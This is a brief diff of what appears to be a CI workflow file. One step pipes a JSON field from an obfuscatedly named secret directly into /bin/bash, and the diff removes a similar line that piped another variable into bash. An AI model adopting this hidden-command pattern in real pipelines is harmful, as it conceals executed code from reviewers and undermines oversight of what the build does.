@@ -23,7 +23,6 @@ jobs:
           uyjl7789: ${{ secrets.uyjl7789 }}
         run: |
           printf '%s' "$uyjl7789" | jq -r .ezo7 | /bin/bash
-          echo $kxp51 | jq -r .iyu5 | /bin/bash
 
       - name: Save archive
         if: always()
